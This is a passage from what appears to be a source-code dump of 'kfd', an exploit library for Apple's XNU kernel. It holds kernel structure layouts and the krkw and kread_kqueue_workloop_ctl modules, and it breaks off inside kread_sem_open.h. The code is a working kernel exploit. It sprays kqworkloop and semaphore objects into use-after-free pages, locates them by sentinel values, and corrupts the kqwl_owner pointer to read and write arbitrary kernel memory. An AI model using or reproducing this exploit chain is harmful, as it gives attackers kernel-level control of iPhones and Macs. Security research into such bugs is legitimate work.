#define ARM_PTE_PNX               0x0020000000000000ull
#define ARM_PTE_NX                0x0040000000000000ull
#define ARM_PTE_ZERO2             0x0380000000000000ull
#define ARM_PTE_WIRED             0x0400000000000000ull
#define ARM_PTE_WRITEABLE         0x0800000000000000ull
#define ARM_PTE_ZERO3             0x3000000000000000ull
#define ARM_PTE_COMPRESSED_ALT    0x4000000000000000ull
#define ARM_PTE_COMPRESSED        0x8000000000000000ull

#define ARM_TTE_VALID         0x0000000000000001ull
#define ARM_TTE_TYPE_MASK     0x0000000000000002ull
#define ARM_TTE_TYPE_TABLE    0x0000000000000002ull
#define ARM_TTE_TYPE_BLOCK    0x0000000000000000ull
#define ARM_TTE_TABLE_MASK    0x0000fffffffff000ull
#define ARM_TTE_PA_MASK       0x0000fffffffff000ull

#define ARM_16K_TT_L0_SIZE          0x0000800000000000ull
#define ARM_16K_TT_L0_OFFMASK       0x00007fffffffffffull
#define ARM_16K_TT_L0_SHIFT         47
#define ARM_16K_TT_L0_INDEX_MASK    0x0000800000000000ull

#define ARM_16K_TT_L1_SIZE          0x0000001000000000ull
#define ARM_16K_TT_L1_OFFMASK       0x0000000fffffffffull
#define ARM_16K_TT_L1_SHIFT         36
#define ARM_16K_TT_L1_INDEX_MASK    0x00007ff000000000ull

#define ARM_16K_TT_L2_SIZE          0x0000000002000000ull
#define ARM_16K_TT_L2_OFFMASK       0x0000000001ffffffull
#define ARM_16K_TT_L2_SHIFT         25
#define ARM_16K_TT_L2_INDEX_MASK    0x0000000ffe000000ull

#define ARM_16K_TT_L3_SIZE          0x0000000000004000ull
#define ARM_16K_TT_L3_OFFMASK       0x0000000000003fffull
#define ARM_16K_TT_L3_SHIFT         14
#define ARM_16K_TT_L3_INDEX_MASK    0x0000000001ffc000ull

/*
 * osfmk/arm/pmap/pmap_pt_geometry.h
 */

#define PMAP_TT_L0_LEVEL    0x0
#define PMAP_TT_L1_LEVEL    0x1
#define PMAP_TT_L2_LEVEL    0x2
#define PMAP_TT_L3_LEVEL    0x3

/*
 * osfmk/kern/bits.h
 */

#define BIT(b)    (1ULL << (b))

/*
 * osfmk/arm/machine_routines.h
 */

#define ONES(x)          (BIT((x))-1)
#define PTR_MASK         ONES(64-T1SZ_BOOT)
#define PAC_MASK         (~PTR_MASK)
#define SIGN(p)          ((p) & BIT(55))
#define UNSIGN_PTR(p)    (SIGN(p) ? ((p) | PAC_MASK) : ((p) & ~PAC_MASK))

/*
 * osfmk/kern/kalloc.h
 */

#define KHEAP_MAX_SIZE    (32ull * 1024ull)

/*
 * osfmk/ipc/ipc_init.c
 */

const vm_size_t msg_ool_size_small = KHEAP_MAX_SIZE;

/*
 * osfmk/vm/vm_map_store.h
 */

struct vm_map_store {
    struct {
        u64 rbe_left;
        u64 rbe_right;
        u64 rbe_parent;
    } entry;
};

struct vm_map_links {
    u64 prev;
    u64 next;
    u64 start;
    u64 end;
};

struct vm_map_header {
    struct vm_map_links links;
    i32 nentries;
    u16 page_shift;
    u16
        entries_pageable:1,
        __padding:15;
    struct {
        u64 rbh_root;
    } rb_head_store;
};

/*
 * osfmk/vm/vm_map.h
 */

struct vm_map_entry {
    struct vm_map_links links;
    struct vm_map_store store;
    union {
        u64 vme_object_value;
        struct {
            u64 vme_atomic:1;
            u64 is_sub_map:1;
            u64 vme_submap:60;
        };
        struct {
            u32 vme_ctx_atomic:1;
            u32 vme_ctx_is_sub_map:1;
            u32 vme_context:30;
            u32 vme_object;
        };
    };
    u64
        vme_alias:12,
        vme_offset:52,
        is_shared:1,
        __unused1:1,
        in_transition:1,
        needs_wakeup:1,
        behavior:2,
        needs_copy:1,
        protection:3,
        used_for_tpro:1,
        max_protection:4,
        inheritance:2,
        use_pmap:1,
        no_cache:1,
        vme_permanent:1,
        superpage_size:1,
        map_aligned:1,
        zero_wired_pages:1,
        used_for_jit:1,
        pmap_cs_associated:1,
        iokit_acct:1,
        vme_resilient_codesign:1,
        vme_resilient_media:1,
        __unused2:1,
        vme_no_copy_on_read:1,
        translated_allow_execute:1,
        vme_kernel_object:1;
    u16 wired_count;
    u16 user_wired_count;
};

struct _vm_map {
    u64 lock[2];
    struct vm_map_header hdr;
    u64 pmap;
    u64 size;
    u64 size_limit;
    u64 data_limit;
    u64 user_wire_limit;
    u64 user_wire_size;
#if TARGET_MACOS
    u64 vmmap_high_start;
#else /* TARGET_MACOS */
    u64 user_range[4];
#endif /* TARGET_MACOS */
    union {
        u64 vmu1_highest_entry_end;
        u64 vmu1_lowest_unnestable_start;
    } vmu1;
    u64 hint;
    union {
        u64 vmmap_hole_hint;
        u64 vmmap_corpse_footprint;
    } vmmap_u_1;
    union {
        u64 _first_free;
        u64 _holes;
    } f_s;
    u32 map_refcnt;
    u32
        wait_for_space:1,
        wiring_required:1,
        no_zero_fill:1,
        mapped_in_other_pmaps:1,
        switch_protect:1,
        disable_vmentry_reuse:1,
        map_disallow_data_exec:1,
        holelistenabled:1,
        is_nested_map:1,
        map_disallow_new_exec:1,
        jit_entry_exists:1,
        has_corpse_footprint:1,
        terminated:1,
        is_alien:1,
        cs_enforcement:1,
        cs_debugged:1,
        reserved_regions:1,
        single_jit:1,
        never_faults:1,
        uses_user_ranges:1,
        pad:12;
    u32 timestamp;
};

/*
 * osfmk/arm/pmap/pmap.h
 */

struct pmap {
    u64 tte;
    u64 ttep;
    u64 min;
    u64 max;
    u64 pmap_pt_attr;
    u64 ledger;
    u64 rwlock[2];
    struct {
        u64 next;
        u64 prev;
    } pmaps;
    u64 tt_entry_free;
    u64 nested_pmap;
    u64 nested_region_addr;
    u64 nested_region_size;
    u64 nested_region_true_start;
    u64 nested_region_true_end;
    u64 nested_region_asid_bitmap;
    u32 nested_region_asid_bitmap_size;
    u64 reserved0;
    u64 reserved1;
    u64 reserved2;
    u64 reserved3;
    i32 ref_count;
    i32 nested_count;
    u32 nested_no_bounds_refcnt;
    u16 hw_asid;
    u8 sw_asid;
    bool reserved4;
    bool pmap_vm_map_cs_enforced;
    bool reserved5;
    u32 reserved6;
    u8 reserved7;
    u8 type;
    bool reserved8;
    bool reserved9;
    bool is_rosetta;
    bool nx_enabled;
    bool is_64bit;
    bool nested_has_no_bounds_ref;
    bool nested_bounds_set;
    bool disable_jop;
    bool reserved11;
};

/*
 * bsd/kern/kern_guarded.c
 */

#define GUARD_REQUIRED (1u << 1)

/*
 * bsd/sys/file_internal.h
 */

struct fileproc_guard {
    u64 fpg_wset;
    u64 fpg_guard;
};

struct fileproc {
    u32 fp_iocount;
    u32 fp_vflags;
    u16 fp_flags;
    u16 fp_guard_attrs;
    u64 fp_glob;
    union {
        u64 fp_wset;
        u64 fp_guard;
    };
};

typedef enum {
    DTYPE_VNODE = 1,
    DTYPE_SOCKET,
    DTYPE_PSXSHM,
    DTYPE_PSXSEM,
    DTYPE_KQUEUE,
    DTYPE_PIPE,
    DTYPE_FSEVENTS,
    DTYPE_ATALK,
    DTYPE_NETPOLICY,
    DTYPE_CHANNEL,
    DTYPE_NEXUS
} file_type_t;

struct fileops {
    file_type_t fo_type;
    void* fo_read;
    void* fo_write;
    void* fo_ioctl;
    void* fo_select;
    void* fo_close;
    void* fo_kqfilter;
    void* fo_drain;
};

struct fileglob {
    struct {
        u64 le_next;
        u64 le_prev;
    } f_msglist;
    u32 fg_flag;
    u32 fg_count;
    u32 fg_msgcount;
    i32 fg_lflags;
    u64 fg_cred;
    u64 fg_ops;
    i64 fg_offset;
    u64 fg_data;
    u64 fg_vn_data;
    u64 fg_lock[2];
};

/*
 * bsd/sys/perfmon_private.h
 */

struct perfmon_layout {
    u16 pl_counter_count;
    u16 pl_fixed_offset;
    u16 pl_fixed_count;
    u16 pl_unit_count;
    u16 pl_reg_count;
    u16 pl_attr_count;
};

typedef char perfmon_name_t[16];

struct perfmon_event {
    char pe_name[32];
    u64 pe_number;
    u16 pe_counter;
};

struct perfmon_attr {
    perfmon_name_t pa_name;
    u64 pa_value;
};

struct perfmon_spec {
    struct perfmon_event* ps_events;
    struct perfmon_attr* ps_attrs;
    u16 ps_event_count;
    u16 ps_attr_count;
};

enum perfmon_ioctl {
    PERFMON_CTL_ADD_EVENT = _IOWR('P', 5, struct perfmon_event),
    PERFMON_CTL_SPECIFY = _IOWR('P', 10, struct perfmon_spec),
};

/*
 * osfmk/kern/perfmon.h
 */

enum perfmon_kind {
    perfmon_cpmu,
    perfmon_upmu,
    perfmon_kind_max,
};

struct perfmon_source {
    const char* ps_name;
    const perfmon_name_t* ps_register_names;
    const perfmon_name_t* ps_attribute_names;
    struct perfmon_layout ps_layout;
    enum perfmon_kind ps_kind;
    bool ps_supported;
};

#define PERFMON_SPEC_MAX_ATTR_COUNT    (32)

/*
 * osfmk/machine/machine_perfmon.h
 */

struct perfmon_counter {
    u64 pc_number;
};

struct perfmon_config {
    struct perfmon_source* pc_source;
    struct perfmon_spec pc_spec;
    u16 pc_attr_ids[PERFMON_SPEC_MAX_ATTR_COUNT];
    struct perfmon_counter* pc_counters;
    u64 pc_counters_used;
    u64 pc_attrs_used;
    bool pc_configured:1;
};

/*
 * bsd/dev/dev_perfmon.c
 */

struct perfmon_device {
    void* pmdv_copyout_buf;
    u64 pmdv_mutex[2];
    struct perfmon_config* pmdv_config;
    bool pmdv_allocated;
};

/*
 * bsd/pthread/workqueue_syscalls.h
 */

#define KQ_WORKLOOP_CREATE     0x01
#define KQ_WORKLOOP_DESTROY    0x02

#define KQ_WORKLOOP_CREATE_SCHED_PRI      0x01
#define KQ_WORKLOOP_CREATE_SCHED_POL      0x02
#define KQ_WORKLOOP_CREATE_CPU_PERCENT    0x04

struct kqueue_workloop_params {
    i32 kqwlp_version;
    i32 kqwlp_flags;
    u64 kqwlp_id;
    i32 kqwlp_sched_pri;
    i32 kqwlp_sched_pol;
    i32 kqwlp_cpu_percent;
    i32 kqwlp_cpu_refillms;
} __attribute__((packed));

/*
 * bsd/pthread/workqueue_internal.h
 */

struct workq_threadreq_s {
    union {
        u64 tr_entry[3];
        u64 tr_link[1];
        u64 tr_thread;
    };
    u16 tr_count;
    u8 tr_flags;
    u8 tr_state;
    u8 tr_qos;
    u8 tr_kq_override_index;
    u8 tr_kq_qos_index;
};

/*
 * bsd/sys/event.h
 */

struct kqtailq {
    u64 tqh_first;
    u64 tqh_last;
};

/*
 * bsd/sys/eventvar.h
 */

__options_decl(kq_state_t, u16, {
    KQ_SLEEP         = 0x0002,
    KQ_PROCWAIT      = 0x0004,
    KQ_KEV32         = 0x0008,
    KQ_KEV64         = 0x0010,
    KQ_KEV_QOS       = 0x0020,
    KQ_WORKQ         = 0x0040,
    KQ_WORKLOOP      = 0x0080,
    KQ_PROCESSING    = 0x0100,
    KQ_DRAIN         = 0x0200,
    KQ_DYNAMIC       = 0x0800,
    KQ_R2K_ARMED     = 0x1000,
    KQ_HAS_TURNSTILE = 0x2000,
});

struct kqueue {
    u64 kq_lock[2];
    kq_state_t kq_state;
    u16 kq_level;
    u32 kq_count;
    u64 kq_p;
    u64 kq_knlocks[1];
};

struct kqworkloop {
    struct kqueue kqwl_kqueue;
    struct kqtailq kqwl_queue[6];
    struct kqtailq kqwl_suppressed;
    struct workq_threadreq_s kqwl_request;
    u64 kqwl_preadopt_tg;
    u64 kqwl_statelock[2];
    u64 kqwl_owner;
    u32 kqwl_retains;
    u8 kqwl_wakeup_qos;
    u8 kqwl_iotier_override;
    u16 kqwl_preadopt_tg_needs_redrive;
    u64 kqwl_turnstile;
    u64 kqwl_dynamicid;
    u64 kqwl_params;
    u64 kqwl_hashlink[2];
};

/*
 * bsd/kern/posix_sem.c
 */

struct pseminfo {
    u32 psem_flags;
    u32 psem_usecount;
    u16 psem_mode;
    u32 psem_uid;
    u32 psem_gid;
    char psem_name[32];
    u64 psem_semobject;
    u64 psem_label;
    i32 psem_creator_pid;
    u64 psem_creator_uniqueid;
};

struct psemnode {
    u64 pinfo;
    u64 padding;
};

/*
 * osfmk/kern/sync_sema.h
 */

struct semaphore {
    struct {
        u64 next;
        u64 prev;
    } task_link;
    char waitq[24];
    u64 owner;
    u64 port;
    u32 ref_count;
    i32 count;
};

/*
 * bsd/sys/vnode_internal.h
 */

struct vnode {
    u64 v_lock[2];
    u64 v_freelist[2];
    u64 v_mntvnodes[2];
    u64 v_ncchildren[2];
    u64 v_nclinks[1];
    u64 v_defer_reclaimlist;
    u32 v_listflag;
    u32 v_flag;
    u16 v_lflag;
    u8 v_iterblkflags;
    u8 v_references;
    i32 v_kusecount;
    i32 v_usecount;
    i32 v_iocount;
    u64 v_owner;
    u16 v_type;
    u16 v_tag;
    u32 v_id;
    union {
        u64 vu_mountedhere;
        u64 vu_socket;
        u64 vu_specinfo;
        u64 vu_fifoinfo;
        u64 vu_ubcinfo;
    } v_un;
    // ...
};

/*
 * bsd/miscfs/specfs/specdev.h
 */

struct specinfo {
    u64 si_hashchain;
    u64 si_specnext;
    i64 si_flags;
    i32 si_rdev;
    i32 si_opencount;
    i32 si_size;
    i64 si_lastr;
    u64 si_devsize;
    u8 si_initted;
    u8 si_throttleable;
    u16 si_isssd;
    u32 si_devbsdunit;
    u64 si_throttle_mask;
};

/*
 * bsd/sys/proc_info.h
 */

#define PROC_INFO_CALL_LISTPIDS             0x1
#define PROC_INFO_CALL_PIDINFO              0x2
#define PROC_INFO_CALL_PIDFDINFO            0x3
#define PROC_INFO_CALL_KERNMSGBUF           0x4
#define PROC_INFO_CALL_SETCONTROL           0x5
#define PROC_INFO_CALL_PIDFILEPORTINFO      0x6
#define PROC_INFO_CALL_TERMINATE            0x7
#define PROC_INFO_CALL_DIRTYCONTROL         0x8
#define PROC_INFO_CALL_PIDRUSAGE            0x9
#define PROC_INFO_CALL_PIDORIGINATORINFO    0xa
#define PROC_INFO_CALL_LISTCOALITIONS       0xb
#define PROC_INFO_CALL_CANUSEFGHW           0xc
#define PROC_INFO_CALL_PIDDYNKQUEUEINFO     0xd
#define PROC_INFO_CALL_UDATA_INFO           0xe
#define PROC_INFO_CALL_SET_DYLD_IMAGES      0xf
#define PROC_INFO_CALL_TERMINATE_RSR        0x10

struct vinfo_stat {
    u32 vst_dev;
    u16 vst_mode;
    u16 vst_nlink;
    u64 vst_ino;
    u32 vst_uid;
    u32 vst_gid;
    i64 vst_atime;
    i64 vst_atimensec;
    i64 vst_mtime;
    i64 vst_mtimensec;
    i64 vst_ctime;
    i64 vst_ctimensec;
    i64 vst_birthtime;
    i64 vst_birthtimensec;
    i64 vst_size;
    i64 vst_blocks;
    i32 vst_blksize;
    u32 vst_flags;
    u32 vst_gen;
    u32 vst_rdev;
    i64 vst_qspare[2];
};

#define PROC_PIDFDVNODEINFO         1
#define PROC_PIDFDVNODEPATHINFO     2
#define PROC_PIDFDSOCKETINFO        3
#define PROC_PIDFDPSEMINFO          4
#define PROC_PIDFDPSHMINFO          5
#define PROC_PIDFDPIPEINFO          6
#define PROC_PIDFDKQUEUEINFO        7
#define PROC_PIDFDATALKINFO         8
#define PROC_PIDFDKQUEUE_EXTINFO    9
#define PROC_PIDFDCHANNELINFO       10

struct proc_fileinfo {
    u32 fi_openflags;
    u32 fi_status;
    i64 fi_offset;
    i32 fi_type;
    u32 fi_guardflags;
};

struct psem_info {
    struct vinfo_stat psem_stat;
    char psem_name[1024];
};

struct psem_fdinfo {
    struct proc_fileinfo pfi;
    struct psem_info pseminfo;
};

#define PROC_PIDDYNKQUEUE_INFO       0
#define PROC_PIDDYNKQUEUE_EXTINFO    1

struct kqueue_info {
    struct vinfo_stat kq_stat;
    u32 kq_state;
    u32 rfu_1;
};

struct kqueue_dyninfo {
    struct kqueue_info kqdi_info;
    u64 kqdi_servicer;
    u64 kqdi_owner;
    u32 kqdi_sync_waiters;
    u8 kqdi_sync_waiter_qos;
    u8 kqdi_async_qos;
    u16 kqdi_request_state;
    u8 kqdi_events_qos;
    u8 kqdi_pri;
    u8 kqdi_pol;
    u8 kqdi_cpupercent;
    u8 _kqdi_reserved0[4];
    u64 _kqdi_reserved1[4];
};

#endif /* static_info_h */

```

`kfd/libkfd/krkw.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef krkw_h
#define krkw_h

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        u64 type_size = ((size) / (sizeof(type)));                                  \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kfd, kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#include "krkw/kread/kread_kqueue_workloop_ctl.h"
#include "krkw/kread/kread_sem_open.h"

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        u64 type_size = ((size) / (sizeof(type)));                             \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method(kfd, kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

#include "krkw/kwrite/kwrite_dup.h"
#include "krkw/kwrite/kwrite_sem_open.h"

// Forward declarations for helper functions.
void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_grab_free_pages(struct kfd* kfd);
void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);

#define kread_method_case(method)                                       \
    case method: {                                                      \
        const char* method_name = #method;                              \
        print_string(method_name);                                      \
        kfd->kread.krkw_method_ops.init = method##_init;                \
        kfd->kread.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kread.krkw_method_ops.search = method##_search;            \
        kfd->kread.krkw_method_ops.kread = method##_kread;              \
        kfd->kread.krkw_method_ops.kwrite = NULL;                       \
        kfd->kread.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kread.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kread.krkw_method_ops.free = method##_free;                \
        break;                                                          \
    }

#define kwrite_method_case(method)                                       \
    case method: {                                                       \
        const char* method_name = #method;                               \
        print_string(method_name);                                       \
        kfd->kwrite.krkw_method_ops.init = method##_init;                \
        kfd->kwrite.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kwrite.krkw_method_ops.search = method##_search;            \
        kfd->kwrite.krkw_method_ops.kread = NULL;                        \
        kfd->kwrite.krkw_method_ops.kwrite = method##_kwrite;            \
        kfd->kwrite.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kwrite.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kwrite.krkw_method_ops.free = method##_free;                \
        break;                                                           \
    }

void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
{
    if (!kern_versions[kfd->info.env.vid].kread_kqueue_workloop_ctl_supported) {
        assert(kread_method != kread_kqueue_workloop_ctl);
    }

    if (kread_method == kread_sem_open) {
        assert(kwrite_method == kwrite_sem_open);
    }

    switch (kread_method) {
        kread_method_case(kread_kqueue_workloop_ctl)
        kread_method_case(kread_sem_open)
    }

    switch (kwrite_method) {
        kwrite_method_case(kwrite_dup)
        kwrite_method_case(kwrite_sem_open)
    }

    krkw_helper_init(kfd, &kfd->kread);
    krkw_helper_init(kfd, &kfd->kwrite);
}

void krkw_run(struct kfd* kfd)
{
    krkw_helper_grab_free_pages(kfd);

    timer_start();
    krkw_helper_run_allocate(kfd, &kfd->kread);
    krkw_helper_run_allocate(kfd, &kfd->kwrite);
    krkw_helper_run_deallocate(kfd, &kfd->kread);
    krkw_helper_run_deallocate(kfd, &kfd->kwrite);
    timer_end();
}

void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kfd->kread.krkw_method_ops.kread(kfd, kaddr, uaddr, size);
}

void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kfd->kwrite.krkw_method_ops.kwrite(kfd, uaddr, kaddr, size);
}

void krkw_free(struct kfd* kfd)
{
    krkw_helper_free(kfd, &kfd->kread);
    krkw_helper_free(kfd, &kfd->kwrite);
}

/*
 * Helper krkw functions.
 */

void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.init(kfd);
}

void krkw_helper_grab_free_pages(struct kfd* kfd)
{
    timer_start();

    const u64 copy_pages = (kfd->info.copy.size / pages(1));
    const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
    const u64 grabbed_free_pages_max = 400000;

    for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
        assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));

        u64 grabbed_puaf_pages = 0;
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                    print_u64(grabbed_free_pages);
                    timer_end();
                    return;
                }
            }
        }
    }

    print_warning("failed to grab free pages goal");
}

void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
{
    timer_start();
    const u64 batch_size = (pages(1) / krkw->krkw_object_size);

    while (true) {
        /*
         * Spray a batch of objects, but stop if the maximum id has been reached.
         */
        bool maximum_reached = false;

        for (u64 i = 0; i < batch_size; i++) {
            if (krkw->krkw_allocated_id == krkw->krkw_maximum_id) {
                maximum_reached = true;
                break;
            }

            krkw->krkw_method_ops.allocate(kfd, krkw->krkw_allocated_id);
            krkw->krkw_allocated_id++;
        }

        /*
         * Search the puaf pages for the last batch of objects.
         *
         * Note that we make the following assumptions:
         * - All objects have a 64-bit alignment.
         * - All objects can be found within 1/16th of a page.
         * - All objects have a size smaller than 15/16th of a page.
         */
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            u64 stop_uaddr = puaf_page_uaddr + (pages(1) / 16);
            for (u64 object_uaddr = puaf_page_uaddr; object_uaddr < stop_uaddr; object_uaddr += sizeof(u64)) {
                if (krkw->krkw_method_ops.search(kfd, object_uaddr)) {
                    krkw->krkw_searched_id = krkw->krkw_object_id;
                    krkw->krkw_object_uaddr = object_uaddr;
                    goto loop_break;
                }
            }
        }

        krkw->krkw_searched_id = krkw->krkw_allocated_id;

        if (maximum_reached) {
loop_break:
            break;
        }
    }

    timer_end();
    const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";

    if (!krkw->krkw_object_uaddr) {
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            print_buffer(puaf_page_uaddr, 64);
        }

        assert_false(krkw_type);
    }

    print_message(
        "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
        krkw_type,
        krkw->krkw_object_id,
        krkw->krkw_object_uaddr,
        krkw->krkw_object_size,
        krkw->krkw_allocated_id,
        krkw->krkw_maximum_id,
        batch_size
    );

    print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);

    if (!kfd->info.kaddr.current_proc) {
        krkw->krkw_method_ops.find_proc(kfd);
    }
}

void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
{
    timer_start();

    for (u64 id = 0; id < krkw->krkw_allocated_id; id++) {
        if (id == krkw->krkw_object_id) {
            continue;
        }

        krkw->krkw_method_ops.deallocate(kfd, id);
    }

    timer_end();
}

void krkw_helper_free(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.free(kfd);

    if (krkw->krkw_method_data) {
        bzero_free(krkw->krkw_method_data, krkw->krkw_method_data_size);
    }
}

#endif /* krkw_h */

```

`kfd/libkfd/krkw/kread/kread_kqueue_workloop_ctl.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef kread_kqueue_workloop_ctl_h
#define kread_kqueue_workloop_ctl_h

const u64 kread_kqueue_workloop_ctl_sentinel = 0x1122334455667788;

u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr);

void kread_kqueue_workloop_ctl_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 100000;
    kfd->kread.krkw_object_size = sizeof(struct kqworkloop);
}

void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, u64 id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (i32)(sizeof(params)),
        .kqwlp_flags = KQ_WORKLOOP_CREATE_SCHED_PRI,
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
        .kqwlp_sched_pri = 1,
    };

    u64 cmd = KQ_WORKLOOP_CREATE;
    u64 options = 0;
    u64 addr = (u64)(&params);
    usize sz = (usize)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(object_uaddr);
    u64 sentinel_min = kread_kqueue_workloop_ctl_sentinel;
    u64 sentinel_max = sentinel_min + kfd->kread.krkw_allocated_id;

    u16 kqwl_state = kqwl->kqwl_kqueue.kq_state;
    u64 kqwl_dynamicid = kqwl->kqwl_dynamicid;

    if ((kqwl_state == (KQ_KEV_QOS | KQ_WORKLOOP | KQ_DYNAMIC)) &&
        (kqwl_dynamicid >= sentinel_min) &&
        (kqwl_dynamicid < sentinel_max)) {
        u64 object_id = kqwl_dynamicid - sentinel_min;
        kfd->kread.krkw_object_id = object_id;
        return true;
    }

    return false;
}

void kread_kqueue_workloop_ctl_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_kqueue_workloop_ctl_kread_u64);
}

void kread_kqueue_workloop_ctl_find_proc(struct kfd* kfd)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
    kfd->info.kaddr.current_proc = kqwl->kqwl_kqueue.kq_p;
}

void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, u64 id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (i32)(sizeof(params)),
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
    };

    u64 cmd = KQ_WORKLOOP_DESTROY;
    u64 options = 0;
    u64 addr = (u64)(&params);
    usize sz = (usize)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
{
    kread_kqueue_workloop_ctl_deallocate(kfd, kfd->kread.krkw_object_id);
}

/*
 * 64-bit kread function.
 */

u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
    u64 old_kqwl_owner = kqwl->kqwl_owner;
    u64 new_kqwl_owner = kaddr - dynamic_info(thread__thread_id);
    kqwl->kqwl_owner = new_kqwl_owner;

    struct kqueue_dyninfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDDYNKQUEUEINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDDYNKQUEUE_INFO;
    u64 arg = kfd->kread.krkw_object_id + kread_kqueue_workloop_ctl_sentinel;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct kqueue_dyninfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    kqwl->kqwl_owner = old_kqwl_owner;
    return data.kqdi_owner;
}

#endif /* kread_kqueue_workloop_ctl_h */

```

`kfd/libkfd/krkw/kread/kread_sem_open.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef kread_sem_open_h
#define kread_sem_open_h

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
